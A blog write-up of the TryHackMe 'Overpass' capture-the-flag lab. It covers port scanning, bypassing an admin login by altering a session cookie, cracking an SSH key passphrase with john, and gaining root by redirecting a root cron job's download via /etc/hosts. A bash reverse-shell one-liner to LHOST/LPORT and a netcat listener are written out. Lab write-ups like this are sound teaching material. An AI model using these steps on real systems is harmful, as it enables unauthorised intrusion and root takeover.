---
layout: post
title: overpass writeup
subtitle: What happens when some broke CompSci students make a password manager?
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/overpass/logo.png
share-img: /assets/img/path.jpg
tags: [ctf,tryhackme, writeup, overpass, bypass , cronjob]
---

What happens when a group of broke Computer Science students try to make a password manager? Obviously a perfect commercial success!


## Here is a machine information

| Title | Overpass | 
| :------ |:--- | 
| Difficulty | Easy | 
| Point | 160 |
| Maker | NinjaJc01 |
| Infor | This is a free room, which means anyone can deploy virtual machines in the room  | 

===============================================================
## RUSTSCAN, Enumeration and Gathering Information
Normally, i will use the rustscan as scan the host and gathering machine information


``` rustscan -b 500 machine-ip -- -sv -sC -A ```
<em>

-b : the batch size for port scanning, it increases or slows the speed of scanning. Depends on the open file limit of your OS.  If you do 65535 it will do every port at the same time. Although, your OS may not support this [default:4500]

-sV -sC -A: it is Nmap custom flag when rustscan run nmap.
</em>

It will take few time to scan: 

![gs1](/assets/img/overpass/1.png)

After the scan is done. There is 2 ports open. It is 22 and 80.

At port 80. it is overpass main page. let check with dirsearch.


![gs1](/assets/img/overpass/2.png)

As seeing. We have admin login. 

![gs1](/assets/img/overpass/3.png)

We can try to do the brute force an credentials. But we should not do it with the hint. Then view page source and we got this.

![gs1](/assets/img/overpass/4.png)

By checking it. The application is only check status of session. We can change to anything to bypass this. 

![gs1](/assets/img/overpass/5.png)

Then we got the public key. Let do the ssh but we the username as james. But it requires the passphrass. 

![gs1](/assets/img/overpass/6.png)

Let's crack it via ssh2john.

```
python ssh2john.py publicKey > hash

john hash --wordlist
```

I am using rockyou as a wordlists here. Then we got the password for public key.

![gs1](/assets/img/overpass/7.png)

Yes, we got the user flag as james login via ssh.

![gs1](/assets/img/overpass/8.png)

## Privilege Escalation

From the james home, we have

![gs1](/assets/img/overpass/9.png)

Let's check crontab. We have the auto script which was run with root user.

![gs1](/assets/img/overpass/10.png)

And check the /etc/hosts. We are able to modify it. Coool!!!!!

Now let prepare the revers shell.

Firstly, we edit the /etc/hosts point to our attack machine.

![gs1](/assets/img/overpass/11.png)

From our attack machine, prepare the buildscript.sh as in the crontab job.

```
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

it should save at attack machine look like.

![gs1](/assets/img/overpass/12.png)

Now from attacker machine. Listen port.

```
nc -lvnp port
```

And also open http server via python3

```
python3 -n http.server 80
```
Now and wait for the cron job rerun and we got shell as root user.

![gs1](/assets/img/overpass/13.png)

Yeah now we have the root flag. !!!!!


Happy Hacking !!!
